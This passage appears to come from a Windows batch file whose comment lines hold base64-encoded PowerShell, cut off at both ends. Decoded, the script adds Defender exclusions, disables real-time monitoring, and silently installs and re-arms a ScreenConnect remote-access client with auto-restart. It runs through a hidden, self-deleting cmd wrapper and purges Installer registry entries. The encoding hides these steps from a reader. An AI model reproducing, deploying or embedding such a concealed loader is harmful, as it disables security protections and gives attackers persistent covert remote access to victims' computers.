::ZXhlJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICBBZGQt
::TXBQcmVmZXJlbmNlIC1FeGNsdXNpb25Qcm9jZXNzICdTY3JlZW5Db25uZWN0Lldp
::bmRvd3NDbGllbnQuZXhlJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0K
::ICAgICAgICBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9y
::aW5nICR0cnVlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfSBj
::YXRjaCB7fQ0KfQ0KDQpmdW5jdGlvbiBDb252ZXJ0VG8tUGFja2VkR3VpZChbc3Ry
::aW5nXSRHdWlkKSB7DQogICAgIyBXaW5kb3dzIEluc3RhbGxlciBzdG9yZXMgUHJv
::ZHVjdENvZGVzIHdpdGggcmV2ZXJzZWQgc2VnbWVudHMgKHBhY2tlZC9zcXVpc2hl
::ZCBHVUlEKS4NCiAgICAkZyA9ICRHdWlkLlRyaW0oJ3t9JykuUmVwbGFjZSgnLScs
::ICcnKQ0KICAgICRzYiA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuU3RyaW5nQnVp
::bGRlcg0KICAgICMgZmlyc3QgMyBzZWdtZW50cyByZXZlcnNlZCBwZXItY2hhciwg
::bGFzdCAyIHNlZ21lbnRzIHJldmVyc2VkIHBlci1ieXRlLXBhaXINCiAgICAkc2Vn
::cyA9IEAoJGcuU3Vic3RyaW5nKDAsOCksICRnLlN1YnN0cmluZyg4LDQpLCAkZy5T
::dWJzdHJpbmcoMTIsNCksICRnLlN1YnN0cmluZygxNiw0KSwgJGcuU3Vic3RyaW5n
::KDIwLDEyKSkNCiAgICBmb3IgKCRpPTA7ICRpIC1sdCAzOyAkaSsrKSB7ICRjID0g
::JHNlZ3NbJGldLlRvQ2hhckFycmF5KCk7IFthcnJheV06OlJldmVyc2UoJGMpOyBb
::dm9pZF0kc2IuQXBwZW5kKC1qb2luICRjKSB9DQogICAgZm9yICgkaT0zOyAkaSAt
::bHQgNTsgJGkrKykgeyAkcyA9ICRzZWdzWyRpXTsgZm9yICgkaj0wOyAkaiAtbHQg
::JHMuTGVuZ3RoOyAkais9MikgeyBbdm9pZF0kc2IuQXBwZW5kKCRzWyRqKzFdKTsg
::W3ZvaWRdJHNiLkFwcGVuZCgkc1skal0pIH0gfQ0KICAgIHJldHVybiAkc2IuVG9T
::dHJpbmcoKS5Ub1VwcGVyKCkNCn0NCg0KZnVuY3Rpb24gUmVtb3ZlLUluc3RhbGxl
::clByb2R1Y3RSZWdpc3RyYXRpb24oW3N0cmluZ10kUHJvZHVjdENvZGUpIHsNCiAg
::ICAjIFB1cmdlIGEgcGhhbnRvbS9jb3JydXB0IFByb2R1Y3RDb2RlIGZyb20gdGhl
::IEluc3RhbGxlciBkYXRhYmFzZSAoSW5zdGFsbGVkPTAwOjAwOjAwDQogICAgIyBy
::ZWdpc3RyYXRpb25zIHRoYXQgc3Vydml2ZSBBUlAgcmVtb3ZhbCBhbmQgbWFrZSAv
::aSBmYWlsIDE2MDMgaW4gbWFpbnRlbmFuY2UgbW9kZSkuDQogICAgaWYgKC1ub3Qg
::JFByb2R1Y3RDb2RlKSB7IHJldHVybiB9DQogICAgJHBhY2tlZCA9IENvbnZlcnRU
::by1QYWNrZWRHdWlkICRQcm9kdWN0Q29kZQ0KICAgICRrZXlzID0gQCgNCiAgICAg
::ICAgIkhLTE06XFNPRlRXQVJFXENsYXNzZXNcSW5zdGFsbGVyXFByb2R1Y3RzXCRw
::YWNrZWQiLA0KICAgICAgICAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRv
::d3NcQ3VycmVudFZlcnNpb25cSW5zdGFsbGVyXFVzZXJEYXRhXFMtMS01LTE4XFBy
::b2R1Y3RzXCRwYWNrZWQiLA0KICAgICAgICAiSEtMTTpcU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCRQcm9kdWN0Q29k
::ZSIsDQogICAgICAgICJIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3Nv
::ZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcJFByb2R1Y3RDb2Rl
::Ig0KICAgICkNCiAgICBmb3JlYWNoICgkayBpbiAka2V5cykgew0KICAgICAgICBp
::ZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkaykgeyBSZW1vdmUtSXRlbSAtTGl0
::ZXJhbFBhdGggJGsgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRs
::eUNvbnRpbnVlIH0NCiAgICB9DQogICAgJiByZWcuZXhlIGRlbGV0ZSAiSEtDUlxJ
::bnN0YWxsZXJcUHJvZHVjdHNcJHBhY2tlZCIgL2YgMj4mMSB8IE91dC1OdWxsDQp9
::DQoNCmZ1bmN0aW9uIFN0YXJ0LUdyeXhhSW5zdGFsbChbc3RyaW5nXSRNc2lQYXRo
::LCBbc3RyaW5nXSRGcCwgW3N0cmluZ10kTG9nRmlsZSkgew0KICAgICMgTDQxOiBu
::ZXZlciB0ZWFyIGRvd24gYSBsaXZlIEd1ZXN0IHNlc3Npb24NCiAgICBpZiAoJEZw
::IC1hbmQgKFRlc3QtU2NSdW5uaW5nICRGcCkpIHsgcmV0dXJuIH0NCiAgICBBZGQt
::U2NEZWZlbmRlckV4Y2x1c2lvbiAkRnANCiAgICAjIEw0MDogc2libGluZy1zYWZl
::IE1TSSAoZW1wdHkgVXBncmFkZSB0YWJsZSkgYmVmb3JlIC9pDQogICAgJHNhZmVN
::c2kgPSBQcm90ZWN0LU1zaVNpYmxpbmdTYWZlICRNc2lQYXRoDQogICAgaWYgKC1u
::b3QgJHNhZmVNc2kpIHsgJHNhZmVNc2kgPSAkTXNpUGF0aCB9DQogICAgJHBjID0g
::R2V0LU1zaVByb3BlcnR5ICRzYWZlTXNpICdQcm9kdWN0Q29kZScNCiAgICAkcGFj
::a2VkID0gJycNCiAgICBpZiAoJHBjKSB7ICRwYWNrZWQgPSBDb252ZXJ0VG8tUGFj
::a2VkR3VpZCAkcGMgfQ0KICAgICRjbWQgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dy
::eXhhX2luc3RhbGwuY21kJw0KICAgICRsaW5lcyA9IEAoJ0BlY2hvIG9mZicpDQog
::ICAgJGxpbmVzICs9ICdyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1p
::Y3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdf
::RFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEnDQogICAgIyBMNDE6IG9ubHkgL3ggcGhh
::bnRvbSBQcm9kdWN0Q29kZSB3aGVuIHNlcnZpY2UgaXMgTk9UIHJ1bm5pbmcgKFNU
::VUNLL0FCU0VOVCBoZWFsKQ0KICAgIGlmICgkcGMgLWFuZCAtbm90IChUZXN0LVNj
::UnVubmluZyAkRnApKSB7DQogICAgICAgICRsaW5lcyArPSAibXNpZXhlYyAveCAk
::cGMgL3FuIC9ub3Jlc3RhcnQgUkVCT09UPVJlYWxseVN1cHByZXNzID5udWwgMj4m
::MSINCiAgICAgICAgaWYgKCRwYWNrZWQpIHsNCiAgICAgICAgICAgICRsaW5lcyAr
::PSAicmVnIGRlbGV0ZSBgIkhLQ1JcSW5zdGFsbGVyXFByb2R1Y3RzXCRwYWNrZWRg
::IiAvZiA+bnVsIDI+JjEiDQogICAgICAgICAgICAkbGluZXMgKz0gInJlZyBkZWxl
::dGUgYCJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJz
::aW9uXEluc3RhbGxlclxVc2VyRGF0YVxTLTEtNS0xOFxQcm9kdWN0c1wkcGFja2Vk
::YCIgL2YgPm51bCAyPiYxIg0KICAgICAgICAgICAgJGxpbmVzICs9ICJyZWcgZGVs
::ZXRlIGAiSEtMTVxTT0ZUV0FSRVxDbGFzc2VzXEluc3RhbGxlclxQcm9kdWN0c1wk
::cGFja2VkYCIgL2YgPm51bCAyPiYxIg0KICAgICAgICB9DQogICAgICAgICRsaW5l
::cyArPSAicmVnIGRlbGV0ZSBgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRv
::d3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCRwY2AiIC9mID5udWwgMj4mMSIN
::CiAgICAgICAgJGxpbmVzICs9ICJyZWcgZGVsZXRlIGAiSEtMTVxTT0ZUV0FSRVxX
::T1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmlu
::c3RhbGxcJHBjYCIgL2YgPm51bCAyPiYxIg0KICAgIH0NCiAgICAkbGluZXMgKz0g
::Im1zaWV4ZWMgL2kgYCIkc2FmZU1zaWAiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJT
::PTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgYCIkTG9nRmlsZWAiIg0KICAg
::ICRsaW5lcyArPSAic2MgY29uZmlnIGAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRG
::cClgIiBzdGFydD0gYXV0byINCiAgICAkbGluZXMgKz0gInNjIGZhaWx1cmUgYCJT
::Y3JlZW5Db25uZWN0IENsaWVudCAoJEZwKWAiIHJlc2V0PSA4NjQwMCBhY3Rpb25z
::PSByZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwL3Jlc3RhcnQvMzAwMCINCiAgICAk
::bGluZXMgKz0gInNjIHN0YXJ0IGAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGcClg
::IiINCiAgICAjIEwzOTogcmVjcmVhdGUgc2V2cnoga2VlcGVycyBhZnRlciBHcnl4
::YSAvaSAoYmVsdCtzdXNwZW5kZXJzIGV2ZW4gd2l0aCBlbXB0eSBVcGdyYWRlIHRh
::YmxlKQ0KICAgIGZvcmVhY2ggKCRzayBpbiAoR2V0LVNldnJ6S2VlcCkpIHsNCiAg
::ICAgICAgJGxpbmVzICs9ICJzYyBjb25maWcgYCJTY3JlZW5Db25uZWN0IENsaWVu
::dCAoJHNrKWAiIHN0YXJ0PSBhdXRvID5udWwgMj4mMSINCiAgICAgICAgJGxpbmVz
::ICs9ICJzYyBzdGFydCBgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkc2spYCIgPm51
::bCAyPiYxIg0KICAgIH0NCiAgICAkcmVzdWx0RmlsZSA9IEpvaW4tUGF0aCAkV29y
::a0RpciAnZ3J5eGFfaW5zdGFsbC5yZXN1bHQnDQogICAgJGxpbmVzICs9ICJlY2hv
::ICVFUlJPUkxFVkVMJT5gIiRyZXN1bHRGaWxlYCIiDQogICAgJGxpbmVzICs9ICJk
::ZWwgL2YgL3EgYCIkc2FmZU1zaWAiID5udWwgMj4mMSINCiAgICAkbGluZXMgKz0g
::ImRlbCAvZiAvcSBgIiRjbWRgIiA+bnVsIDI+JjEiDQogICAgJGxpbmVzICs9ICdl
::eGl0Jw0KICAgIFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY21kIC1WYWx1ZSAk
::bGluZXMgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQ0KICAgIFN0YXJ0LVByb2Nlc3Mg
::Y21kLmV4ZSAtQXJndW1lbnRMaXN0ICIvYyBgIiRjbWRgIiIgLVdpbmRvd1N0eWxl
::IEhpZGRlbg0KfQ0KDQpmdW5jdGlvbiBNYXJrLUdyeXhhUmVpbnN0YWxsIHsNCiAg
::ICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAn
::Z3J5eGFfcmVpbnN0YWxsLmZsYWcnKSAtVmFsdWUgKEdldC1EYXRlKS5Ub1VuaXZl
::cnNhbFRpbWUoKS5Ub1N0cmluZygnbycpIC1FbmNvZGluZyBBU0NJSSAtRm9yY2UN
::Cn0NCg0KZnVuY3Rpb24gR2V0LUdyeXhhTWlncmF0ZU9sZFBhdGggeyBKb2luLVBh
::dGggJFdvcmtEaXIgJ2dyeXhhX21pZ3JhdGVfb2xkLnR4dCcgfQ0KDQpmdW5jdGlv
::biBTYXZlLUdyeXhhTWlncmF0ZU9sZChbc3RyaW5nW11dJE9sZEZwcywgW3N0cmlu
::Z10kTmV3RnApIHsNCiAgICAkb2xkcyA9IEAoJE9sZEZwcyB8IFdoZXJlLU9iamVj
::dCB7ICRfIC1hbmQgKCRfIC1uZSAkTmV3RnApIH0gfCBTZWxlY3QtT2JqZWN0IC1V
::bmlxdWUpDQogICAgaWYgKC1ub3QgJG9sZHMuQ291bnQpIHsNCiAgICAgICAgUmVt
::b3ZlLUl0ZW0gLUxpdGVyYWxQYXRoIChHZXQtR3J5eGFNaWdyYXRlT2xkUGF0aCkg
::LUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIHJl
::dHVybg0KICAgIH0NCiAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEdldC1H
::cnl4YU1pZ3JhdGVPbGRQYXRoKSAtVmFsdWUgJG9sZHMgLUVuY29kaW5nIEFTQ0lJ
::IC1Gb3JjZQ0KfQ0KDQpmdW5jdGlvbiBDb21wbGV0ZS1Hcnl4YU1pZ3JhdGVPbGQg
::ew0KICAgICMgTDQyOiBvbmx5IHN0cmlwIHByZXZpb3VzIEdyeXhhIEZQIGFmdGVy
::IHRoZSBuZXcgRXhwZWN0ZWRGcCBpcyBSdW5uaW5nLg0KICAgICRwID0gR2V0LUdy
::eXhhTWlncmF0ZU9sZFBhdGgNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRl
::cmFsUGF0aCAkcCkpIHsgcmV0dXJuIH0NCiAgICAkZXhwID0gJHNjcmlwdDpHcnl4
::YUV4cGVjdGVkRnANCiAgICAkcnVubmluZyA9IEZpbmQtUnVubmluZ0dyeXhhRnAN
::CiAgICBpZiAoLW5vdCAkcnVubmluZykgeyByZXR1cm4gfQ0KICAgIGlmICgkZXhw
::IC1hbmQgKCRydW5uaW5nIC1uZSAkZXhwLlRvTG93ZXIoKSkpIHsgcmV0dXJuIH0N
::CiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9lbnN1cmUubG9n
::Jw0KICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkcCAtRXJyb3JBY3Rpb24g
::U2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJG9s
::ZCA9IChbc3RyaW5nXSRfKS5UcmltKCkuVG9Mb3dlcigpDQogICAgICAgIGlmICgt
::bm90ICRvbGQgLW9yICgkb2xkIC1lcSAkcnVubmluZykpIHsgcmV0dXJuIH0NCiAg
::ICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICgnezB9
::IG1pZ3JhdGVfY2xlYW51cF9vbGQ9ezF9IG5ldz17Mn0nIC1mIChHZXQtRGF0ZSAt
::Rm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tOnNzJyksICRvbGQsICRydW5uaW5nKSAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAkbnVsbCA9IFVu
::aW5zdGFsbC1TY0ZpbmdlcnByaW50ICRvbGQNCiAgICB9DQogICAgUmVtb3ZlLUl0
::ZW0gLUxpdGVyYWxQYXRoICRwIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
::b250aW51ZQ0KfQ0KDQpmdW5jdGlvbiBTdGFydC1Hcnl4YU1pZ3JhdGUoW3N0cmlu
::Z10kTXNpUGF0aCwgW3N0cmluZ10kTmV3RnAsIFtzdHJpbmdbXV0kT2xkRnBzLCBb
::c3RyaW5nXSRSZWFzb24pIHsNCiAgICAjIEw0Mjogc2libGluZy1zYWZlIC9pIG9m
::IE5ld0ZwIEZJUlNUIOKAlCBrZWVwIE9sZEZwcyBSdW5uaW5nIHVudGlsIENvbXBs
::ZXRlLUdyeXhhTWlncmF0ZU9sZC4NCiAgICBTYXZlLUdyeXhhTWlncmF0ZU9sZCAk
::T2xkRnBzICROZXdGcA0KICAgIENsZWFyLUdyeXhhQXJwICROZXdGcA0KICAgIFNl
::dC1Hcnl4YUZwICROZXdGcA0KICAgIFN0YXJ0LUdyeXhhSW5zdGFsbCAkTXNpUGF0
::aCAkTmV3RnAgKEpvaW4tUGF0aCAkV29ya0RpciAnbXNpX2dyeXhhX2RldGFjaGVk
::LmxvZycpDQogICAgTWFyay1Hcnl4YVJlaW5zdGFsbA0KICAgIHJldHVybiAiSU5G
::TElHSFR8JE5ld0ZwfCRSZWFzb24iDQp9DQoNCmZ1bmN0aW9uIEludm9rZS1Hcnl4
::YUVuc3VyZSB7DQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
::JFdvcmtEaXIpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGgg
::JFdvcmtEaXIgLUZvcmNlIHwgT3V0LU51bGwgfQ0KICAgICRsb2cgPSBKb2luLVBh
::dGggJFdvcmtEaXIgJ2dyeXhhX2Vuc3VyZS5sb2cnDQogICAgZnVuY3Rpb24gR0xv
::Zyhbc3RyaW5nXSRtKSB7IEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1W
::YWx1ZSAoJ3swfSB7MX0nIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRk
::IEhIOm1tOnNzJyksICRtKSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9
::DQoNCiAgICBDb21wbGV0ZS1Hcnl4YU1pZ3JhdGVPbGQNCg0KICAgICRpbnN0YWxs
::Q21kID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9pbnN0YWxsLmNtZCcNCiAg
::ICAjIEwzMjogb25seSBob25vciB0aGUgc2luZ2xlLWZsaWdodCBsb2NrIGlmIG1z
::aWV4ZWMgaXMgQUNUVUFMTFkgcnVubmluZy4NCiAgICBpZiAoKFRlc3QtUGF0aCAk
::aW5zdGFsbENtZCkgLWFuZCAoKChHZXQtRGF0ZSkgLSAoR2V0LUl0ZW0gJGluc3Rh
::bGxDbWQpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgMTUpKSB7DQog
::ICAgICAgICRtc2lSdW5uaW5nID0gW2Jvb2xdKEdldC1DaW1JbnN0YW5jZSBXaW4z
::Ml9Qcm9jZXNzIC1GaWx0ZXIgIk5hbWU9J21zaWV4ZWMuZXhlJyIgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0
::IHsgJF8uQ29tbWFuZExpbmUgLW1hdGNoICdncnl4YXxwa2dfZ3J5eGF8U2NyZWVu
::Q29ubmVjdCcgfSkNCiAgICAgICAgaWYgKCRtc2lSdW5uaW5nKSB7IEdMb2cgJ2lu
::ZmxpZ2h0X2luc3RhbGwnOyByZXR1cm4gIklORkxJR0hUfCQoR2V0LUdyeXhhRnAp
::fGluZmxpZ2h0PTEiIH0NCiAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRo
::ICRpbnN0YWxsQ21kIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZQ0KICAgICAgICBHTG9nICdzdGFsZV9pbnN0YWxsX3dyYXBwZXJfY2xlYXJlZCcN
::CiAgICB9DQoNCiAgICAkZnAgPSBHZXQtR3J5eGFGcA0KICAgICRleHAgPSAkc2Ny
::aXB0OkdyeXhhRXhwZWN0ZWRGcA0KICAgIGlmICgtbm90ICRleHApIHsgJGV4cCA9
::ICRmcCB9DQoNCiAgICAjIEw0MS9MNDIgLUZvcmNlOiBlbnN1cmUtdXAsIG5ldmVy
::IGtpbGwgbGFzdCBHcnl4YS4gTWlncmF0ZSA9IGluc3RhbGwtbmV3LWZpcnN0Lg0K
::ICAgIGlmICgkRm9yY2UpIHsNCiAgICAgICAgJHJ1bm5pbmdGb3JjZSA9IEZpbmQt
::UnVubmluZ0dyeXhhRnANCiAgICAgICAgaWYgKCRydW5uaW5nRm9yY2UgLWFuZCAo
::KC1ub3QgJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIC1vciAoJHJ1bm5pbmdGb3Jj
::ZSAtZXEgJGV4cCkpKSB7DQogICAgICAgICAgICBTZXQtR3J5eGFGcCAkcnVubmlu
::Z0ZvcmNlDQogICAgICAgICAgICBHTG9nICJmb3JjZV9za2lwX2FscmVhZHlfcnVu
::bmluZyBmcD0kcnVubmluZ0ZvcmNlIg0KICAgICAgICAgICAgcmV0dXJuICJIRUFM
::VEhZfCRydW5uaW5nRm9yY2V8cnVubmluZz0xfGZvcmNlLXNraXBwZWQ9MSINCiAg
::ICAgICAgfQ0KICAgICAgICBHTG9nICJmb3JjZV9lbnN1cmUgdGFyZ2V0PSRleHAg
::cnVubmluZz0kcnVubmluZ0ZvcmNlIg0KICAgICAgICAkbXNpID0gR2V0LUdyeXhh
::TXNpDQogICAgICAgIGlmICgtbm90ICRtc2kpIHsgR0xvZyAnbXNpX3VuYXZhaWxh
::YmxlJzsgcmV0dXJuICJVTkhFQUxUSFl8JGV4cHxtc2ktdW5hdmFpbGFibGUiIH0N
::CiAgICAgICAgJG5ld0ZwID0gR2V0LUZwRnJvbVByb2R1Y3ROYW1lIChHZXQtTXNp
::UHJvcGVydHkgJG1zaSAnUHJvZHVjdE5hbWUnKQ0KICAgICAgICBpZiAoLW5vdCAk
::bmV3RnApIHsgJG5ld0ZwID0gJGV4cCB9DQogICAgICAgIGlmICgkcnVubmluZ0Zv
::cmNlIC1hbmQgKCRydW5uaW5nRm9yY2UgLWVxICRuZXdGcCkpIHsNCiAgICAgICAg
::ICAgIFNldC1Hcnl4YUZwICRydW5uaW5nRm9yY2UNCiAgICAgICAgICAgIEdMb2cg
::ImZvcmNlX3NraXBfbXNpX2ZwX3J1bm5pbmcgZnA9JHJ1bm5pbmdGb3JjZSINCiAg
::ICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmluZ0ZvcmNlfHJ1bm5pbmc9
::MXxmb3JjZS1za2lwcGVkPTEiDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIChT
::dGFydC1Hcnl4YU1pZ3JhdGUgJG1zaSAkbmV3RnAgQCgkZnAsICRydW5uaW5nRm9y
::Y2UsICRleHApICdmb3JjZS1taWdyYXRlPTEnKQ0KICAgIH0NCg0KICAgICMgRlAg
::cm90YXRpb246IGluc3RhbGwgRXhwZWN0ZWRGcCBmaXJzdDsgc3RyaXAgb2xkIG9u
::bHkgYWZ0ZXIgbmV3IGlzIFJ1bm5pbmcNCiAgICBpZiAoJHNjcmlwdDpHcnl4YUV4
::cGVjdGVkRnApIHsNCiAgICAgICAgJHJ1bm5pbmdGcDAgPSBGaW5kLVJ1bm5pbmdH
::cnl4YUZwDQogICAgICAgIGlmICgoJGZwIC1uZSAkZXhwKSAtb3IgKCRydW5uaW5n
::RnAwIC1hbmQgJHJ1bm5pbmdGcDAgLW5lICRleHApKSB7DQogICAgICAgICAgICBH
::TG9nICJmcF9kcmlmdCBtaWdyYXRlIGN1cnJlbnQ9JGZwIHJ1bm5pbmc9JHJ1bm5p
::bmdGcDAgZXhwZWN0ZWQ9JGV4cCINCiAgICAgICAgICAgICRtc2kgPSBHZXQtR3J5
::eGFNc2kNCiAgICAgICAgICAgIGlmICgtbm90ICRtc2kpIHsNCiAgICAgICAgICAg
::ICAgICAjIGtlZXAgd2hhdGV2ZXIgR3J5eGEgaXMgdXAg4oCUIGRvIG5vdCB1bmlu
::c3RhbGwgb24gTVNJIG1pc3MNCiAgICAgICAgICAgICAgICBpZiAoJHJ1bm5pbmdG
::cDApIHsNCiAgICAgICAgICAgICAgICAgICAgU2V0LUdyeXhhRnAgJHJ1bm5pbmdG
::cDANCiAgICAgICAgICAgICAgICAgICAgR0xvZyAiZnBfZHJpZnRfZGVmZXJyZWRf
::bXNpX3VuYXZhaWxhYmxlIGtlZXA9JHJ1bm5pbmdGcDAiDQogICAgICAgICAgICAg
::ICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmluZ0ZwMHxydW5uaW5nPTF8bWln
::cmF0ZS1kZWZlcnJlZD0xIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAg
::ICAgICBHTG9nICdtc2lfdW5hdmFpbGFibGUnDQogICAgICAgICAgICAgICAgcmV0
::dXJuICJVTkhFQUxUSFl8JGV4cHxtc2ktdW5hdmFpbGFibGUiDQogICAgICAgICAg
::ICB9DQogICAgICAgICAgICAkbmV3RnAgPSBHZXQtRnBGcm9tUHJvZHVjdE5hbWUg
::KEdldC1Nc2lQcm9wZXJ0eSAkbXNpICdQcm9kdWN0TmFtZScpDQogICAgICAgICAg
::ICBpZiAoLW5vdCAkbmV3RnApIHsgJG5ld0ZwID0gJGV4cCB9DQogICAgICAgICAg
::ICBpZiAoJHJ1bm5pbmdGcDAgLWFuZCAoJHJ1bm5pbmdGcDAgLWVxICRuZXdGcCkp
::IHsNCiAgICAgICAgICAgICAgICBTZXQtR3J5eGFGcCAkcnVubmluZ0ZwMA0KICAg
::ICAgICAgICAgICAgIEdMb2cgImZwX2RyaWZ0X2FscmVhZHlfb25fbXNpX2ZwIGZw
::PSRydW5uaW5nRnAwIg0KICAgICAgICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwk
::cnVubmluZ0ZwMHxydW5uaW5nPTEiDQogICAgICAgICAgICB9DQogICAgICAgICAg
::ICByZXR1cm4gKFN0YXJ0LUdyeXhhTWlncmF0ZSAkbXNpICRuZXdGcCBAKCRmcCwg
::JHJ1bm5pbmdGcDApICdtaWdyYXRlLXNwYXduZWQ9MScpDQogICAgICAgIH0NCiAg
::ICB9DQoNCiAgICAkcnVubmluZ0ZwID0gRmluZC1SdW5uaW5nR3J5eGFGcA0KICAg
::IGlmICgkcnVubmluZ0ZwKSB7DQogICAgICAgIFNldC1Hcnl4YUZwICRydW5uaW5n
::RnANCiAgICAgICAgIyBMMzkgLURlZXA6IFRDUC9yZWxheSBhZHZpc29yeTsgZG8g
::Tk9UIHJlaW5zdGFsbCBzb2xlbHkgb24gVENQIGZhaWwgKGxlYXJuZWQgdGhhdCBs
::ZXNzb24pDQogICAgICAgIGlmICgkRGVlcCkgew0KICAgICAgICAgICAgJHRjcFIg
::PSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6R3J5eGFSZWxheUhvc3QgNDQzDQog
::ICAgICAgICAgICAkdGNwVSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpHcnl4
::YVVpSG9zdCA0NDMNCiAgICAgICAgICAgIEdMb2cgImRlZXBfb2sgZnA9JHJ1bm5p
::bmdGcCByZWxheT0kdGNwUiB1aT0kdGNwVSINCiAgICAgICAgICAgIHJldHVybiAi
::SEVBTFRIWXwkcnVubmluZ0ZwfHJ1bm5pbmc9MXxkZWVwPTF8cmVsYXk9JHRjcFJ8
::dWk9JHRjcFUiDQogICAgICAgIH0NCiAgICAgICAgR0xvZyAiaGVhbHRoeV9ydW5u
::aW5nIGZwPSRydW5uaW5nRnAiDQogICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVu
::bmluZ0ZwfHJ1bm5pbmc9MSINCiAgICB9DQoNCiAgICAkc3QgPSBHZXQtR3J5eGFT
::dGF0dXMgJGZwDQogICAgR0xvZyAic3RhdHVzPSRzdCBmb3JjZT0kRm9yY2UgZGVl
::cD0kRGVlcCINCiAgICAka2luZCA9ICRzdC5TcGxpdCgnfCcpWzBdDQoNCiAgICBz
::d2l0Y2ggKCRraW5kKSB7DQogICAgICAgICdIRUFMVEhZJyB7IHJldHVybiAkc3Qg
::fQ0KICAgICAgICAnQlJPS0VOJyB7DQogICAgICAgICAgICAkbmFtZSA9ICJTY3Jl
::ZW5Db25uZWN0IENsaWVudCAoJGZwKSINCiAgICAgICAgICAgICYgc2MuZXhlIGNv
::bmZpZyAkbmFtZSBzdGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAg
::ICAgICYgc2MuZXhlIGZhaWx1cmUgJG5hbWUgcmVzZXQ9IDg2NDAwIGFjdGlvbnM9
::IHJlc3RhcnQvMzAwMC9yZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwIDI+JjEgfCBP
::dXQtTnVsbA0KICAgICAgICAgICAgJiBzYy5leGUgc3RhcnQgJG5hbWUgMj4mMSB8
::IE91dC1OdWxsDQogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA2DQog
::ICAgICAgICAgICAmIHNjLmV4ZSBzdGFydCAkbmFtZSAyPiYxIHwgT3V0LU51bGwN
::CiAgICAgICAgICAgIGlmIChUZXN0LVNjUnVubmluZyAkZnApIHsgR0xvZyAnc3Rh
::cnRlZF9vayc7IHJldHVybiAiSEVBTFRIWXwkZnB8c3RhcnRlZD0xIiB9DQogICAg
::ICAgICAgICAkbXNpID0gR2V0LUdyeXhhTXNpDQogICAgICAgICAgICBpZiAoLW5v
::dCAkbXNpKSB7IEdMb2cgJ21zaV91bmF2YWlsYWJsZSc7IHJldHVybiAiVU5IRUFM
